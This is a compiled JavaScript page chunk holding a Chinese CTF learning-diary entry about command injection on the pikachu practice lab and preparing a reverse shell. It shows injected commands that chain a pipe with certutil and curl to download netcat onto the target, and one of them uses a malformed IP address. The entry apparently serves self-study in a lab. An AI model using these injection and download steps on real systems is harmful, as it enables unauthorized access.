(window.webpackJsonp=window.webpackJsonp||[]).push([[190],{708:function(e,t,s){"use strict";s.r(t);var a=s(2),n=Object(a.a)({},(function(){var e=this,t=e._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("Boxx"),e._v(" "),t("p",[e._v("从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第54天")]),e._v(" "),t("p",[e._v("今日内容：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),e._v(" "),t("p"),t("div",{staticClass:"table-of-contents"},[t("ul",[t("li",[t("a",{attrs:{href:"#防火墙出入站"}},[e._v("防火墙出入站")]),t("ul",[t("li",[t("a",{attrs:{href:"#整理思路"}},[e._v("整理思路：")])])])])])]),t("p"),e._v(" "),t("ul",[t("li",[e._v("小迪安全视频地址【"),t("RouterLink",{attrs:{to:"/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/"}},[e._v("🔗传送门")]),e._v("】")],1)]),e._v(" "),t("h1",{attrs:{id:"第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#第24章-基础入门-反弹shell-带外查询-正反向连接-防火墙出入站-文件下载"}},[e._v("#")]),e._v(" 第24章：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载")]),e._v(" "),t("h2",{attrs:{id:"防火墙出入站"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#防火墙出入站"}},[e._v("#")]),e._v(" 防火墙出入站")]),e._v(" "),t("p",[e._v("书接上回")]),e._v(" "),t("p",[e._v("我们尝试用IP地址拼接命令的方式，中间用管道符连接。我们在输入框中输入以下内容：")]),e._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("127.0.0.1 | whoami\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:"/img/ctfLearn/image-20250112201835751.png",alt:"image-20250112201835751"}})]),e._v(" "),t("p",[e._v("如图所示，如果是用管道符连接的话，会不执行命令1，只执行命令2，利用这种特性，我们可以让他做反弹Shell，将权限给到我们入侵方。")]),e._v(" "),t("p",[e._v("其次，这里系统是用的Windows部署的"),t("code",[e._v("phpStudy")]),e._v("和"),t("code",[e._v("pikachu漏洞平台")]),e._v("，而Windows是没有自带nc工具的，我们需要做上传文件，去将nc上传到服务器。")]),e._v(" "),t("p",[e._v("这里上传文件的地方，我们可以转换思路，既然可以用命令，那就可以用下载，比如Linux的wget、curl，或者Windows的PowerShell、cmd的certutil.exe等。")]),e._v(" "),t("h3",{attrs:{id:"整理思路"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#整理思路"}},[e._v("#")]),e._v(" 整理思路：")]),e._v(" "),t("ol",[t("li",[t("p",[e._v("判断是不是Windows系统，这里我们刚才在执行"),t("code",[e._v("whoami")]),e._v("时，返回的用户是"),t("code",[e._v("administrator")]),e._v("(我认为这样判断不严谨)")])]),e._v(" "),t("li",[t("p",[e._v("Windows没有自带的nc工具，需要想办法上传nc工具。")])]),e._v(" "),t("li",[t("p",[e._v("通过下载的方式将nc送到这台Windows上。")])]),e._v(" "),t("li",[t("p",[e._v("我们拼接命令，用"),t("code",[e._v("IP+管道符+下载命令")]),e._v("的形式，视频中演示的是下载小迪提前准备好的服务器上的nc工具")]),e._v(" "),t("div",{staticClass:"language-cmd line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("127.0.0.1 | certutil.exe -urlcache -split -f http://47.94.346.117:80/nc.exe c:\\\\nc.exe\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("blockquote",[t("p",[e._v("Windows上没有nc工具，需要自己下载一个nc.exe工具【"),t("a",{attrs:{href:"https://eternallybored.org/misc/netcat/",target:"_blank",rel:"noopener noreferrer"}},[e._v("下载地址"),t("OutboundLink")],1),e._v("】，使用命令时如果不加环境变量就要写成nc.exe")])]),e._v(" "),t("p",[e._v("这里我们没有提前准备服务器，懒得找个服务器放这些，就用官方的下载地址凑活一下，也能用。我们换种方式，用"),t("code",[e._v("curl -O")]),e._v("的方式应该也是可以的，应该是通用的。")]),e._v(" "),t("div",{staticClass:"language-cmd line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[e._v("127.0.0.1 | curl https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o c:/Users/xxx/Desktop\\netcat.zip\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("😶虽然成功下载了，但问题是从官网下载的是个安装包，还没解压，不好搞呀")]),e._v(" "),t("p",[e._v("😫还有个问题，我的虚拟机是以前的工作用的，这有当时公司的杀毒软件，下载的时候报了弹窗，好烦。")]),e._v(" "),t("p",[e._v("没办法，只能重新装一个Win10的虚拟机了，这老东家的杀软卸不掉")])])]),e._v(" "),t("p",[e._v("好累呀，重装了个系统，phpstudy和pikachu，好烦，今天先休息了")])],1)}),[],!1,null,null,null);t.default=n.exports}}]);